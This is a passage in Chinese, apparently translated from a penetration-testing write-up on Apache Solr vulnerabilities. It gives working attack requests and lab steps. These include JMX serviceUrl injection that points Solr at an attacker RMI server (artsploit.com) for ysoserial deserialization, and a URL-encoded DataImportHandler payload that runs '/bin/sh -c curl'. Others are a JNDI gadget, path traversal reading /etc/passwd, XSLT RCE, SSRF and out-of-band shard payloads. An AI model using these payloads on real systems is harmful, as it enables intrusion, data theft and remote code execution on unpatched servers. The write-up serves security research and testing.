@@ -1,0 +1,110 @@
+通过ConfigAPI可设置'jmx.serviceUrl'属性，然后创建一个新的JMX MBeans服务器并且在指定的RMI/LDAP注册表上注册。
+    POST /solr/db/config HTTP/1.1
+    Host: localhost:8983
+    Content-Type: application/json
+    Content-Length: 112
+    {
+      "set-property": { 
+        "jmx.serviceUrl": "service:jmx:rmi:///jndi/rmi://artsploit.com:1617/jmxrmi"
+      }
+    }
+在代码层，它通过对RMI/LDAP/CORBA服务器进行“绑定（bind）”操作，然后触发JNDI调用。 与JNDI
+'lookup'不同，'bind'操作不支持远程调用类，因此我们无法引用外部代码库。
+同时，它通过`JMXConnectorServer.start()`创建一个新的低安全性的JMX服务器：
+    public static MBeanServer findMBeanServerForServiceUrl(String serviceUrl) throws IOException {
+      if (serviceUrl == null) {
+        return null;
+      }
+      MBeanServer server = MBeanServerFactory.newMBeanServer();
+      JMXConnectorServer connector = JMXConnectorServerFactory
+          .newJMXConnectorServer(new JMXServiceURL(serviceUrl), null, server);
+      connector.start();
+      return server;
+    }
+最终调用为`InitialDirContext.bind(serviceUrl)`，（如果使用RMI协议）还将调用`sun.rmi.transport.StreamRemoteCall.executeCall()`，那里包含了反序列化入口`ObjectInputStream.readObject()`。
+有两种攻击方式：
+#### 利用反序列化
+恶意RMI服务器可以通过 `ObjectInputStream`方法响应任意对象，并且在Solr端反序列化。显然这是不安全的。
+使用[ysoserial](https://github.com/frohoff/ysoserial)工具的['ysoserial.exploit.JRMPListener'](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPListener.java)类可以快速构建一个RMI服务器。
+根据目标的classpath，攻击者可以使用一个“gadget chains”在Solr端获取远程执行代码。
+其中一个可用gadget为[ROME](https://github.com/artsploit/ysoserial/blob/master/src/main/java/ysoserial/payloads/ROME2.java)。这是因为Solr包含了一个数据提取功能的库：“contrib/extraction/lib/rome-1.5.1.jar”，但该库为可选，只是包含在Solr的配置中。
+此外，你还可以试试Jdk7u21 gadget链。
+**实验（solr 6.6.5, MacOS, java8u192）** ：
+  1. 下载解压solr6.6.5:
+        wget https://www.apache.org/dist/lucene/solr/6.6.5/solr-6.6.5.zip
+    unzip solr-6.6.5.zip
+    cd solr-6.6.5/
+  2. 根据contrib/extraction/README.txt文档说明，复制提取依赖关系：
+        cp -a contrib/extraction/lib/ server/lib/
+  3. 启动solr
+        ./bin/solr start -e techproducts
+  4. 在另一个文件夹中，下载编译ysoserial项目（你可能要对ysoserial的版本做一点修改）
+        git clone https://github.com/artsploit/ysoserial
+    cd ysoserial
+    mvn clean package -DskipTests
+  5. 启动恶意RMI服务器，在1617端口处理ROME2对象：
+        java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1617 ROME2 "/Applications/Calculator.app/Contents/MacOS/Calculator"
+  6. 设置`jmx.serviceUrl`属性，使Solr与RMI服务器进行通信：
+        curl -X POST -H 'Content-type: application/json' -d '{"set-property":{"jmx.serviceUrl":"service:jmx:rmi:///jndi/rmi://localhost:1617/solrjmx"}}' http://localhost:8983/solr/techproducts/config
+  7. Solr服务器执行"/Applications/Calculator.app/Contents/MacOS/Calculator"，弹出计算器。在对象反序列化完毕后，Solr会抛出"UnexpectedException"。
+#### 访问JMX进行攻击
+另一种方法是设置特定的RMI注册表（例如使用JDK的'rmiregistry'），使得Solr在上面注册JMX。 然后Solr会随机选取一个端口，创建JMX
+MBean服务器，并会把该端口写入攻击者的RMI注册表中。
+如果没有防火墙阻拦该端口，则攻击者可以通过metasploit的java_jmx_server模块或使用mjet部署一个恶意的MBean。该漏洞的根本原因是无需身份令牌即可创建JMX
+Mbeans服务器。
+**实验：**
+  1. 启动Solr
+        ./bin/solr start -e techproducts
+  2. 创建一个特定的RMI注册表：
+        rmiregistry 1617
+  3. 设置`jmx.serviceUrl`属性，使得Solr与恶意RMI服务器通信
+        curl -X POST -H 'Content-type: application/json' -d '{"set-property":{"jmx.serviceUrl":"service:jmx:rmi:///jndi/rmi://localhost:1617/jmxrmi"}}' http://localhost:8983/solr/techproducts/config
+  4. 在本地注册表中查看Solr JMX端口
+        nmap -A -v 127.0.0.1 -p 1617 --version-all
+  1. 通过mjet工具部署一个恶意的Mbean
+        jython mjet.py 127.0.0.1 1617 install pass http://127.0.0.1:8000 8000
+### 3\. [CVE-2019-0193] 通过dataImportHandler实现RCE
+**适用的Solr版本** ：1.3 – 8.2
+**要求** ：启用DataImportHandler
+Solr提供了[DataImportHandler](https://cwiki.apache.org/confluence/display/solr/DataImportHandler)，通过该方式可以从数据库或URL导入数据，同时也可以在dataConfig参数的脚本标记中插入恶意JavaScript代码，然后代码将在每一个导入的文档中执行。
+向Solr服务器发出的利用请求：
+**实验：**
+    GET /solr/db/dataimport?command=full-import&dataConfig=%3c%64%61%74%61%43%6f%6e%66%69%67%3e%0d%0a%20%20%3c%64%61%74%61%53%6f%75%72%63%65%20%74%79%70%65%3d%22%55%52%4c%44%61%74%61%53%6f%75%72%63%65%22%2f%3e%0d%0a%3c%73%63%72%69%70%74%3e%3c%21%5b%43%44%41%54%41%5b%66%75%6e%63%74%69%6f%6e%20%66%31%28%64%61%74%61%29%7b%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%5b%22%28%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%5b%5d%29%22%5d%28%5b%22%2f%62%69%6e%2f%73%68%22%2c%22%2d%63%22%2c%22%63%75%72%6c%20%31%32%37%2e%30%2e%30%2e%31%3a%38%39%38%34%2f%78%78%78%22%5d%29%2e%73%74%61%72%74%28%29%7d%5d%5d%3e%3c%2f%73%63%72%69%70%74%3e%0d%0a%20%20%3c%64%6f%63%75%6d%65%6e%74%3e%0d%0a%20%20%20%20%3c%65%6e%74%69%74%79%20%6e%61%6d%65%3d%22%78%78%22%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%75%72%6c%3d%22%68%74%74%70%3a%2f%2f%6c%6f%63%61%6c%68%6f%73%74%3a%38%39%38%33%2f%73%6f%6c%72%2f%61%64%6d%69%6e%2f%69%6e%66%6f%2f%73%79%73%74%65%6d%22%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%70%72%6f%63%65%73%73%6f%72%3d%22%58%50%61%74%68%45%6e%74%69%74%79%50%72%6f%63%65%73%73%6f%72%22%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%66%6f%72%45%61%63%68%3d%22%2f%72%65%73%70%6f%6e%73%65%22%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%74%72%61%6e%73%66%6f%72%6d%65%72%3d%22%48%54%4d%4c%53%74%72%69%70%54%72%61%6e%73%66%6f%72%6d%65%72%2c%52%65%67%65%78%54%72%61%6e%73%66%6f%72%6d%65%72%2c%73%63%72%69%70%74%3a%66%31%22%3e%0d%0a%20%20%20%20%3c%2f%65%6e%74%69%74%79%3e%0d%0a%20%20%3c%2f%64%6f%63%75%6d%65%6e%74%3e%0d%0a%3c%2f%64%61%74%61%43%6f%6e%66%69%67%3e
+测试时，请确保Solr端可以访问到URL中的“实体”部分，并且会返回有效的XML文档以便进行Xpath评估。
+另一种方法是使用dataSource类型 - “JdbcDataSource”以及驱动程序“com.sun.rowset.JdbcRowSetImpl”：
+**实验** ：
+    GET /solr/db/dataimport?command=full-import&dataConfig=%3c%64%61%74%61%43%6f%6e%66%69%67%3e%0d%0a%20%20%3c%64%61%74%61%53%6f%75%72%63%65%20%74%79%70%65%3d%22%4a%64%62%63%44%61%74%61%53%6f%75%72%63%65%22%20%64%72%69%76%65%72%3d%22%63%6f%6d%2e%73%75%6e%2e%72%6f%77%73%65%74%2e%4a%64%62%63%52%6f%77%53%65%74%49%6d%70%6c%22%20%6a%6e%64%69%4e%61%6d%65%3d%22%72%6d%69%3a%2f%2f%6c%6f%63%61%6c%68%6f%73%74%3a%36%30%36%30%2f%78%78%78%22%20%61%75%74%6f%43%6f%6d%6d%69%74%3d%22%74%72%75%65%22%2f%3e%0d%0a%20%20%3c%64%6f%63%75%6d%65%6e%74%3e%0d%0a%20%20%20%20%3c%65%6e%74%69%74%79%20%6e%61%6d%65%3d%22%78%78%22%3e%0d%0a%20%20%20%20%3c%2f%65%6e%74%69%74%79%3e%0d%0a%20%20%3c%2f%64%6f%63%75%6d%65%6e%74%3e%0d%0a%3c%2f%64%61%74%61%43%6f%6e%66%69%67%3e
+这样，我们通过使用基于'com.sun.rowset.JdbcRowSetImpl'类的一个gadget链执行反序列化。它需要为'jndiName'和'autoCommit'属性调用两个set方法，然后跳转到可利用的'InitialContext.lookup'，我们可以将它作为普通的JNDI解析攻击来利用。
+有关JNDI攻击的方法，请参阅[Exploiting JNDI
+Injections](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)。 Solr基于Jetty，因此攻击Tomcat的一些tircks在这里并不适用，但你可以尝试使用最近为LDAP修复的远程类加载的方法。
+### 4\. [CVE-2012-6612, CVE-2013-6407, CVE-2013-6408] Update中的XXE
+**适用的Solr版本** ：1.3 - 4.1 or 4.3.1
+**要求** ：无
+如果你遇到了一个老版本的Solr，则它的'/update'非常有可能易受XXE攻击：
+    POST /solr/db/update HTTP/1.1
+    Host: 127.0.0.1:8983
+    Content-Type: application/xml
+    Content-Length: 136
+    ]>
+        &xx;
+### 5\. [CVE-2013-6397] 通过路径遍历和XSLT响应写入实现RCE
+**适用的Solr版本** ：1.3 - 4.1 or 4.3.1
+**要求** ：可以上传XLS文件到指定目录。
+这是[Nicolas
+Grégoire](https://twitter.com/Agarri_FR)在2013年发现的，他也写了一篇漏洞分析[文章](\[a good
+blogpost\]\(https://www.agarri.fr/blog/archives/2013/11/27/compromising_an_unreachable_solr_server_with_cve-2013-6397/index.html))。
+    GET /solr/db/select/?q=31337&wt=xslt&tr=../../../../../../../../../../../../../../../../../usr/share/ant/etc/ant-update.xsl
+### 6\. [CVE-2017-3163] 通过ReplicationHandler实现任意文件读取
+**适用的Solr版本** ：5.5.4~6.4.1
+要求：无
+    GET /solr/db/replication?command=filecontent&file=../../../../../../../../../../../../../etc/passwd&wt=filestream&generation=1
+其实这里还有个未修补的SSRF漏洞，但由于"shards"特性，它不被视为漏洞。
+    GET /solr/db/replication?command=fetchindex&masterUrl=http://callback/xxxx&wt=json&httpBasicAuthUser=aaa&httpBasicAuthPassword=bbb
+## 黑盒测试
+综上所述，漏洞猎人如果在目标网站上发现全文搜索的搜索表单时，可以发送以下OOB Payload以检测此漏洞，这非常值得一试：
+    GET /xxx?q=aaa%26shards=http://callback_server/solr 
+    GET /xxx?q=aaa&shards=http://callback_server/solr
+    GET /xxx?q={!type=xmlparser v=""}
+## 小结
+不管Solr实例是面向Internet，反向代理后端或仅由内部Web应用程序使用，用户可以自主修改Solr的搜索参数，因此存在非常大的风险。
+如果将Solr用作Web服务且可以访问，那么攻击者通过Solr（本地）参数注入，可以修改或查看Solr集群中的所有数据，甚至还可以组合其他漏洞获取远程代码执行权限。
